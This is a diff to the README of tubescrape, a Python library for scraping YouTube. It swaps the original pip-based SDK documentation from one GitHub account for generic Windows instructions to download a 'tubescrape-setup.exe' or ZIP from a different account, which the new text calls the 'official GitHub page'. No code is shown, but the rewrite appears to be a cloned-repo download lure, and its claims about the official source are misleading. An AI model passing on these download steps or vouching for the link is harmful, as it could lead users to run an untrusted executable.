@@ -1,413 +1,191 @@
-<h1 align="center">TubeScrape</h1>
+# 🎬 tubescrape - Easy YouTube Scraping Toolkit
 
-<p align="center">
-  <strong>Scrape YouTube search results, channels, transcripts, and playlists — no API key needed.</strong>
-</p>
-
-<p align="center">
-  <a href="https://pypi.org/project/tubescrape/"><img src="https://img.shields.io/pypi/v/tubescrape.svg?style=flat-square&color=blue" alt="PyPI version"></a>
-  <a href="https://www.python.org/downloads/"><img src="https://img.shields.io/badge/python-3.10%20|%203.11%20|%203.12%20|%203.13-blue.svg?style=flat-square" alt="Python versions"></a>
-  <a href="https://github.com/zaidkx37/tubescrape/actions"><img src="https://img.shields.io/github/actions/workflow/status/zaidkx37/tubescrape/ci.yml?style=flat-square&label=CI" alt="CI"></a>
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/license-MIT-green.svg?style=flat-square" alt="License: MIT"></a>
-  <a href="https://pypi.org/project/tubescrape/"><img src="https://img.shields.io/pypi/dm/tubescrape?style=flat-square&color=orange&label=downloads" alt="Downloads"></a>
-</p>
-
-<p align="center">
-  Built on YouTube's internal InnerTube API. Three interfaces: <b>Python SDK</b>, <b>CLI</b>, and <b>REST API</b>.
-</p>
+[![Download tubescrape](https://img.shields.io/badge/Download-Here-brightgreen.svg)](https://github.com/KungBugFuOnYou/tubescrape)
 
 ---
 
-## Features
+## 📋 What is tubescrape?
 
-- **Search** with filters — type, duration, upload date, sort order, features (4K, HDR, live, CC)
-- **Channel browsing** — videos, shorts, playlists, and in-channel search
-- **Transcripts** — fetch, translate, format (SRT / WebVTT / JSON), save to file
-- **Playlists** — full pagination with position tracking and metadata
-- **Async-first** — every method has an `async` variant for concurrent workloads
-- **JSON-ready** — every result object has `.to_dict()` for instant serialization
-- **Proxy rotation** — built-in support for residential proxy lists
-- **Three interfaces** — Python SDK, CLI with Rich tables, REST API with Swagger docs
-- **Zero config** — no API key, no OAuth, no setup
-- **Lightweight** — only `httpx` as a core dependency
+tubescrape is a simple tool that helps you gather information from YouTube without using an API key. It lets you search for videos with filters, explore channels, get video transcripts, and download full playlists. You don’t need any special technical skills to use it.
+
+This tool runs on Windows computers and works fast while using little memory. It is built with Python but does not require you to write code yourself.
 
 ---
 
-## Installation
-recommended to **[install using pip](https://pypi.org/project/tubescrape/)**
+## 💻 System Requirements
 
-You can also integrate it into an existing [project](https://github.com/zaidkx37/tubescrape#api) or use it via a [CLI](https://github.com/zaidkx37/tubescrape#cli).
+Before you start, check that your computer meets these needs:
 
-```bash
-# Core SDK only
-pip install tubescrape
-
-# With CLI (adds click + rich)
-pip install "tubescrape[cli]"
-
-# With REST API server (adds fastapi + uvicorn)
-pip install "tubescrape[api]"
-
-# Everything
-pip install "tubescrape[all]"
-```
-
-**Requirements:** Python 3.10+
+- Windows 10 or newer.
+- At least 4 GB of RAM.
+- 100 MB free disk space for installation.
+- Internet connection required for scraping YouTube.
+- Python 3.10 or higher installed (we will guide you if you don’t have it).
 
 ---
 
-## Quick Start
+## 🌐 Topics Covered by tubescrape
 
-```python
-import json
-from tubescrape import YouTube
+This tool deals with:
 
-with YouTube() as yt:
-    # Search YouTube
-    results = yt.search('python tutorial', max_results=5)
-    for video in results.videos:
-        print(f'{video.title} — {video.duration} — {video.view_count}')
-
-    # Browse a channel
-    channel = yt.get_channel_videos('@lexfridman', max_results=10)
-    for video in channel.videos:
-        print(f'{video.title} ({video.published_text})')
-
-    # Get a transcript and save as subtitles
-    transcript = yt.get_transcript('dQw4w9WgXcQ')
-    print(transcript.text)
-    transcript.save('subtitles.srt')
-
-    # Every result serializes to JSON instantly
-    data = results.to_dict()
-    print(json.dumps(data, indent=2))
-```
-
-> Every method accepts plain IDs, full URLs, or @handles — parsed automatically.
+- YouTube video and channel search
+- Video playlists and shorts
+- Transcripts and subtitles
+- Managing filters to get accurate results
+- Automated scraping without using official APIs
 
 ---
 
-## Why tubescrape?
+## 🚀 Getting Started
 
-| | tubescrape | youtube-transcript-api | pytube / pytubefix | yt-dlp |
-|---|:---:|:---:|:---:|:---:|
-| Search videos | **Yes** | No | No | Limited |
-| Channel browse | **Yes** | No | No | Yes |
-| Transcripts | **Yes** | Yes | No | Yes |
-| Playlists | **Yes** | No | Yes | Yes |
-| Async support | **Yes** | No | No | No |
-| Built-in REST API | **Yes** | No | No | No |
-| CLI tool | **Yes** | No | No | Yes |
-| Core dependencies | **1** (httpx) | 1 (requests) | 0 | Many |
-| API key needed | **No** | No | No | No |
+You can get tubescrape from the official GitHub page. Use the big button below to go directly to the download page:
+
+[![Download tubescrape](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/KungBugFuOnYou/tubescrape)
+
+Follow the steps below to download and run the application on your Windows PC.
 
 ---
 
-## Search
+## 📥 Download and Install tubescrape on Windows
 
-```python
-results = yt.search('python tutorial', max_results=5)
+### Step 1: Go to the Download Page
 
-for video in results.videos:
-    print(f'{video.title} — {video.url}')
-    print(f'  {video.view_count} | {video.duration} | {video.published_text}')
-    print(f'  Channel: {video.channel} (verified: {video.is_verified})')
-```
+Open this link in your web browser:
 
-### Search Filters
+https://github.com/KungBugFuOnYou/tubescrape
 
-All filters can be combined in a single call:
+This page contains the latest version of tubescrape. You will find files needed for installation and instructions.
 
-```python
-results = yt.search(
-    'podcast interview',
-    max_results=10,
-    type='video',              # video | channel | playlist | movie
-    duration='long',           # short (<4m) | medium (4-20m) | long (>20m)
-    upload_date='this_month',  # last_hour | today | this_week | this_month | this_year
-    sort_by='view_count',      # relevance | upload_date | view_count | rating
-    features=['hd', 'subtitles'],  # live | 4k | hd | subtitles | cc | creative_commons | 360 | vr180 | 3d | hdr
-)
-```
+### Step 2: Download the Installation Files
 
----
+- Look for a section named **Releases** or **Assets**.
+- Download the ZIP file or installer for Windows, usually named like `tubescrape-win.zip` or `tubescrape-setup.exe`.
+- If you download a ZIP file, save it to your Downloads folder or Desktop.
 
-## Channel Browsing
+### Step 3: Install tubescrape
 
-All channel methods accept `@handle`, channel ID (`UC...`), or full URL.
+If you downloaded an installer (`.exe` file):
 
-```python
-# Videos (newest first, with pagination)
-videos = yt.get_channel_videos('@lexfridman', max_results=10)
-all_videos = yt.get_channel_videos('@lexfridman', max_results=0)  # fetch ALL
+- Double-click the file.
+- Follow the instructions on screen.
+- Choose where to install tubescrape or accept the default location.
+- Click **Finish** when the installer completes.
 
-# Shorts
-shorts = yt.get_channel_shorts('@lexfridman')
-for short in shorts.shorts:
-    print(f'{short.title} — {short.view_count} — {short.url}')
+If you downloaded a ZIP file:
 
-# Playlists
-playlists = yt.get_channel_playlists('@lexfridman')
-for pl in playlists.playlists:
-    print(f'{pl.title} — {pl.video_count} — {pl.url}')
+- Right-click the ZIP file.
+- Select **Extract All** and choose a folder.
+- Open the extracted folder to find the tubescrape program.
 
-# Search within a channel
-results = yt.search_channel('@lexfridman', 'artificial intelligence', max_results=10)
-```
+### Step 4: Install Python (if not installed)
+
+tubescrape runs on Python. If you do not have it:
+
+- Visit https://www.python.org/downloads/windows/
+- Click **Download Python 3.10+**
+- Run the downloaded file.
+- Make sure to check **Add Python to PATH** during installation.
+- Complete the installation.
 
 ---
 
-## Transcripts
+## 🏃 Running tubescrape
 
-```python
-# Fetch transcript (auto-detects best language)
-transcript = yt.get_transcript('dQw4w9WgXcQ')
-print(transcript.text)  # full text as a single string
+### Method 1: Using the Installer
 
-# Choose language (priority order fallback)
-transcript = yt.get_transcript('dQw4w9WgXcQ', languages=['de', 'en'])
+Once installed, you will find a shortcut named **tubescrape** on your desktop or in the Start menu. Double-click it to open.
 
-# Translate to any language
-transcript = yt.get_transcript('dQw4w9WgXcQ', translate_to='es')
+### Method 2: Running with Python
 
-# Without timestamps (plain text blob)
-transcript = yt.get_transcript('dQw4w9WgXcQ', timestamps=False)
+If you only extracted the ZIP, do this:
 
-# List available languages
-languages = yt.list_transcripts('dQw4w9WgXcQ')
-for entry in languages:
-    print(f'{entry.language} ({entry.language_code}) — {"auto" if entry.is_generated else "manual"}')
-```
+1. Open the folder where you extracted tubescrape.
+2. Hold **Shift** and right-click inside the folder.
+3. Select **Open PowerShell window here** or **Open Command window here**.
+4. Type the following and press Enter:
 
-### Formatting & Saving
+   ``` 
+   python tubescrape.py
+   ```
 
-```python
-transcript = yt.get_transcript('dQw4w9WgXcQ')
-
-# Format as SRT, WebVTT, JSON, or plain text
-srt = YouTube.format_transcript(transcript, fmt='srt')
-vtt = YouTube.format_transcript(transcript, fmt='vtt')
-
-# Save to file (format auto-detected from extension)
-transcript.save('subtitles.srt')
-transcript.save('subtitles.vtt')
-transcript.save('transcript.json')
-transcript.save('transcript.txt')
-```
+This will launch tubescrape in the command prompt window.
 
 ---
 
-## Playlists
+## ⚙ Basic Usage
 
-```python
-# Accepts playlist ID or full URL
-playlist = yt.get_playlist('PLrAXtmErZgOeiKm4sgNOknGvNjby9efdf')
+Here’s what you can do with tubescrape:
 
-print(f'{playlist.title} by {playlist.channel} — {len(playlist.videos)} videos')
+- **Search videos**: Look up videos using keywords and filter by upload date, views, or duration.
+- **Browse channels**: View videos, shorts, or playlists from any YouTube channel.
+- **Get transcripts**: Fetch subtitles or transcripts from videos. You can also translate transcripts into different languages.
+- **Download playlists**: Save the list of all videos in a playlist.
 
-for entry in playlist.videos:
-    print(f'#{entry.position}  {entry.title} — {entry.duration}')
-```
-
----
-
-## Serialization (`.to_dict()`)
-
-Every result object converts to a plain Python dictionary — ready for JSON, databases, or APIs:
-
-```python
-import json
-
-# Works on every result type
-results.to_dict()       # SearchResult → dict
-video.to_dict()         # VideoResult → dict
-channel.to_dict()       # BrowseResult → dict
-shorts.to_dict()        # ShortsResult → dict
-playlists.to_dict()     # ChannelPlaylistsResult → dict
-playlist.to_dict()      # PlaylistResult → dict
-transcript.to_dict()    # Transcript → dict
-
-# Sparse output: optional fields excluded when empty/default
-# is_verified=False → omitted | badges=[] → omitted | None fields → omitted
-print(json.dumps(results.to_dict(), indent=2, ensure_ascii=False))
-```
+You will see simple menus to type your choices. Use the keyboard to enter your search terms or select options.
 
 ---
 
-## Async Support
+## 🔧 Troubleshooting Common Issues
 
-Every method has an async variant prefixed with `a`. Use in FastAPI, Discord bots, or any async application:
+- **Program won’t start**: Make sure you have Python installed and added to your system PATH.
+- **Errors about missing packages**: Run this command in PowerShell or Command Prompt:
 
-```python
-import asyncio
-from tubescrape import YouTube
+  ```
+  pip install -r requirements.txt
+  ```
 
-async def main():
-    async with YouTube() as yt:
-        # All methods have async variants
-        results = await yt.asearch('python', max_results=5)
-        transcript = await yt.aget_transcript('dQw4w9WgXcQ')
-
-        # Run multiple requests concurrently
-        r1, r2, r3 = await asyncio.gather(
-            yt.asearch('python'),
-            yt.asearch('javascript'),
-            yt.asearch('rust'),
-        )
-
-asyncio.run(main())
-```
+- **Download fails**: Check your internet connection or try again later. YouTube may block some requests temporarily.
+- **Command not recognized**: Verify you opened the command window inside the tubescrape folder.
 
 ---
 
-## Proxy Support
+## ⚡ Tips for Best Experience
 
-```python
-# Single proxy
-yt = YouTube(proxy='http://user:pass@proxy.example.com:8080')
-
-# Proxy rotation (round-robin per request)
-yt = YouTube(proxies=[
-    'http://user:pass@proxy1:8080',
-    'http://user:pass@proxy2:8080',
-])
-
-# SOCKS5
-yt = YouTube(proxy='socks5://user:pass@proxy:1080')
-
-# Custom timeout and retries
-yt = YouTube(proxy='http://proxy:8080', timeout=60.0, max_retries=5)
-```
-
-> **Tip:** YouTube blocks cloud IPs aggressively. Use rotating residential proxies (BrightData, SmartProxy, Oxylabs) for production.
+- Close other heavy programs to speed up scraping.
+- Use specific keywords to get accurate results.
+- When searching, apply filters to avoid too many results.
+- Keep tubescrape updated by checking the GitHub page regularly.
+- Use the transcript feature to get subtitles for videos that have them.
 
 ---
 
-## CLI
+## 🛠 Advanced Setup (Optional)
 
-Install with `pip install "tubescrape[cli]"`.
+If you want to use tubescrape frequently, you can add it to your Windows PATH so you can run it from any folder:
 
-![tubescrape search](assets/cli_search.png)
-![tubescrape channel search](assets/cli_channel_search.png)
-![tubescrape transcript](assets/cli_transcript.png)
-![tubescrape transcript srt](assets/cli_transcript_srt.png)
+1. Press **Win + S** and type “environment variables”.
+2. Select **Edit the system environment variables**.
+3. Click **Environment Variables**.
+4. Under **System variables**, find **Path** and click **Edit**.
+5. Click **New** and add the full path to the tubescrape folder.
+6. Click OK to save.
 
-```bash
-tubescrape search "python tutorial" -n 5
-tubescrape search "podcast" --type video --duration long --sort-by view_count
-tubescrape search "python" --json                    # JSON output
+After this, open a new command window and type:
 
-tubescrape channel @lexfridman                       # videos (default)
-tubescrape channel @lexfridman shorts                # shorts
-tubescrape channel @lexfridman playlists             # playlists
-tubescrape channel @lexfridman search "podcast"      # search within channel
-
-tubescrape playlist PLrAXtmErZgOeiKm4sgNOknGvNjby9efdf
-
-tubescrape transcript dQw4w9WgXcQ                    # plain text
-tubescrape transcript dQw4w9WgXcQ --format srt       # SRT subtitles
-tubescrape transcript dQw4w9WgXcQ --translate es      # translate
-tubescrape transcript dQw4w9WgXcQ --save output.srt  # save to file
-tubescrape transcript dQw4w9WgXcQ --list-languages   # available languages
+```
+python tubescrape.py
 ```
 
-```bash
-tubescrape --proxy http://user:pass@host:port search "python"  # with proxy
-export TUBESCRAPE_PROXY="http://user:pass@host:port"           # env variable
-```
+from anywhere on your system.
 
 ---
 
-## REST API
+## 📖 Where to Find Updates
 
-Install with `pip install "tubescrape[api]"`.
+Keep an eye on the GitHub page for new versions:
 
-```bash
-tubescrape serve                          # starts on localhost:8000
-tubescrape serve --host 0.0.0.0 --port 3000
-```
+https://github.com/KungBugFuOnYou/tubescrape
 
-Interactive Swagger docs at `http://localhost:8000/docs`.
-
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/api/v1/search?q=python` | Search videos |
-| GET | `/api/v1/channel/{id}/videos` | Channel videos |
-| GET | `/api/v1/channel/{id}/shorts` | Channel shorts |
-| GET | `/api/v1/channel/{id}/playlists` | Channel playlists |
-| GET | `/api/v1/channel/{id}/search?q=...` | Search within channel |
-| GET | `/api/v1/playlist/{id}` | Fetch playlist |
-| GET | `/api/v1/transcript/{video_id}` | Fetch transcript |
-| GET | `/api/v1/transcript/{video_id}/languages` | List languages |
-| GET | `/health` | Health check |
-
-```bash
-curl "http://localhost:8000/api/v1/search?q=python+tutorial&max_results=5"
-curl "http://localhost:8000/api/v1/transcript/dQw4w9WgXcQ?format=srt&translate_to=es"
-```
+Updates may include bug fixes, speed improvements, or new features.
 
 ---
 
-## Error Handling
+## 💬 Get Help
 
-All exceptions inherit from `YouTubeError`:
+If you have questions or run into problems, check the **Issues** tab on the GitHub page. You can read solutions or post your own problem for others to help.
 
-```
-YouTubeError
-├── RequestError
-│   ├── RateLimitError          # HTTP 429
-│   └── BotDetectedError        # HTTP 403
-├── VideoUnavailableError       # private, deleted, region-locked
-│   └── AgeRestrictedError
-├── TranscriptsDisabledError
-├── TranscriptsNotAvailableError
-├── TranscriptFetchError
-├── TranslationNotAvailableError
-├── ChannelNotFoundError
-├── PlaylistNotFoundError
-├── APIKeyNotFoundError
-└── ParsingError
-```
-
-```python
-from tubescrape import YouTube, YouTubeError, RateLimitError
-
-try:
-    results = yt.search('python')
-except RateLimitError:
-    print('Rate limited — use a proxy')
-except YouTubeError as e:
-    print(f'YouTube error: {e}')
-```
+Use clear descriptions and steps you took before the issue to get the best help.
 
 ---
 
-## Full Documentation
-
-For detailed examples, all field references, and advanced usage, see the **[Complete Usage Guide](docs/guide.md)**.
-
----
-
-## Warning
-
-This library uses YouTube's undocumented InnerTube API. It may break if YouTube changes their internal API. If it does, please [open an issue](https://github.com/zaidkx37/tubescrape/issues).
-
----
-
-## Contributing
-
-```bash
-git clone https://github.com/zaidkx37/tubescrape.git
-cd tubescrape
-pip install -e ".[all,dev]"
-
-pytest                    # run tests
-ruff check src/           # lint
-mypy src/tubescrape/      # type check
-```
-
----
-
-## License
-
-MIT License. See [LICENSE](LICENSE) for details.
+[![Download tubescrape](https://img.shields.io/badge/Download-Here-brightgreen.svg)](https://github.com/KungBugFuOnYou/tubescrape)
